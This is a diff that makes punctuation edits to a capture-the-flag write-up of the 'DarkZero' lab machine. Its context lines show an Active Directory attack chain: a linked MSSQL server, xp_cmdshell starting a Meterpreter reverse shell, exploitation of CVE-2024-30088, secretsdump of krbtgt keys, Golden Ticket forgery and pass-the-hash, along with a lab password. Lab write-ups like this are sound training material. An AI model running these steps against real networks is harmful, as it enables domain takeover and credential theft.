@@ -79,7 +79,7 @@ Key findings: port 1433 (MSSQL), port 3268 (Global Catalog → likely multi-doma
 crackmapexec smb 10.129.110.78 -u john.w -p 'RFulUtONCOL!' --shares
 ```
 
-![crackmapexec SMB — no interesting shares](/images/writeups/darkzero/1.png)
+![crackmapexec SMB: no interesting shares](/images/writeups/darkzero/1.png)
 
 Nothing useful. Generic shares only. Moving on to BloodHound.
 
@@ -122,7 +122,7 @@ BloodHound reveals a second domain: `darkzero.ext`.
 
 ### MSSQL Access
 
-We have creds and port 1433 is open — try authenticating:
+We have creds and port 1433 is open, try authenticating:
 
 ```bash
 impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!@10.129.110.78' -windows-auth
@@ -138,7 +138,7 @@ SELECT name FROM sys.servers
 
 ![sys.servers shows DC02.darkzero.ext](/images/writeups/darkzero/9.png)
 
-There's a linked server pointing to `DC02.darkzero.ext`. Running `help` inside impacket-mssqlclient gives us the next clue — it shows the commands we can perform, and we can see that we can link to another server using `use_link`:
+There's a linked server pointing to `DC02.darkzero.ext`. Running `help` inside impacket-mssqlclient gives us the next clue, it shows the commands we can perform, and we can see that we can link to another server using `use_link`:
 
 ```
 use_link "DC02.darkzero.ext"
@@ -146,7 +146,7 @@ use_link "DC02.darkzero.ext"
 
 ![Linked to DC02](/images/writeups/darkzero/11.png)
 
-We've hopped onto DC02. Enumerating it doesn't turn up anything dramatic, but looking back at the help menu we see we can execute `cmd` using `xp_cmdshell` — which means we can run commands directly on the server and even get a reverse shell.
+We've hopped onto DC02. Enumerating it doesn't turn up anything dramatic, but looking back at the help menu we see we can execute `cmd` using `xp_cmdshell`, which means we can run commands directly on the server and even get a reverse shell.
 
 ---
 
@@ -208,13 +208,13 @@ EXEC xp_cmdshell 'C:\Windows\Temp\meterp_x64_tcp.exe';
 
 We have Meterpreter as `darkzero-ext\svc_sql`. Typing `getuid` confirms: `Server username: darkzero-ext\svc_sql`. Check privileges:
 
-![whoami /priv — limited privileges](/images/writeups/darkzero/16.png)
+![whoami /priv: limited privileges](/images/writeups/darkzero/16.png)
 
-Privileges are very limited. Normally we'd go straight to `Users\Administrator\Desktop` for `user.txt`, but it's not there — we're operating as the service account `svc_sql` and need to elevate. Time to enumerate the server further.
+Privileges are very limited. Normally we'd go straight to `Users\Administrator\Desktop` for `user.txt`, but it's not there. We're operating as the service account `svc_sql` and need to elevate. Time to enumerate the server further.
 
 ---
 
-## Privilege Escalation — CVE-2024-30088
+## Privilege Escalation: CVE-2024-30088
 
 ### winPEAS
 
@@ -236,7 +236,7 @@ winPEASx64.exe
 
 ![winPEAS running](/images/writeups/darkzero/19.png)
 
-winPEAS uses a color legend — focus on red:
+winPEAS uses a color legend: focus on red:
 
 ![winPEAS legend](/images/writeups/darkzero/20.png)
 
@@ -244,7 +244,7 @@ One finding stands out: `kernel32` flagged as vulnerable.
 
 ![kernel32 flagged by winPEAS](/images/writeups/darkzero/21.png)
 
-This is **CVE-2024-30088** — a Windows kernel race condition for local privilege escalation to SYSTEM. A quick search leads to [attackerkb.com/topics/y8MOqV0WPr/cve-2024-30088](https://attackerkb.com/topics/y8MOqV0WPr/cve-2024-30088) — *Exploitability: High*. We use Metasploit's built-in module to exploit it.
+This is **CVE-2024-30088**, a Windows kernel race condition for local privilege escalation to SYSTEM. A quick search leads to [attackerkb.com/topics/y8MOqV0WPr/cve-2024-30088](https://attackerkb.com/topics/y8MOqV0WPr/cve-2024-30088), *Exploitability: High*. We use Metasploit's built-in module to exploit it.
 
 ### Exploit
 
@@ -270,7 +270,7 @@ Now `whoami` returns `nt authority\system`. Navigate to Administrator's desktop:
 
 ---
 
-## Post-Exploitation — Golden Ticket
+## Post-Exploitation: Golden Ticket
 
 With SYSTEM on DC02, the next goal is compromising `darkzero.htb` (DC01) to get `root.txt`.
 
@@ -315,7 +315,7 @@ export KRB5CCNAME=dc01.ccache
 secretsdump.py -k -no-pass -dc-ip <ip> -just-dc-user DC01$ @darkzero.htb
 ```
 
-![secretsdump output — krbtgt AES key](/images/writeups/darkzero/26.png)
+![secretsdump output: krbtgt AES key](/images/writeups/darkzero/26.png)
 
 ### Forge Golden Ticket as DC01$
 
@@ -352,11 +352,11 @@ evil-winrm -i <ip> -u Administrator -H <NTLM_hash>
 
 ## Lessons Learned
 
-- Always enumerate for multi-domain environments — linked MSSQL servers can be a direct bridge between domains
+- Always enumerate for multi-domain environments, linked MSSQL servers can be a direct bridge between domains
 - `xp_cmdshell` via `sysadmin` SQL auth gives immediate code execution; restrict SQL server privileges in production
-- CVE-2024-30088 shows kernel vulnerabilities remain a reliable SYSTEM path — keep servers patched
-- PetitPotam coerces DC authentication — Golden Ticket attacks persist indefinitely once you have the krbtgt key
-- Time sync (`ntpdate`) is non-negotiable for Kerberos — anything over 5 minutes skew kills the auth
+- CVE-2024-30088 shows kernel vulnerabilities remain a reliable SYSTEM path, keep servers patched
+- PetitPotam coerces DC authentication, Golden Ticket attacks persist indefinitely once you have the krbtgt key
+- Time sync (`ntpdate`) is non-negotiable for Kerberos, anything over 5 minutes skew kills the auth
 
 ## References
 
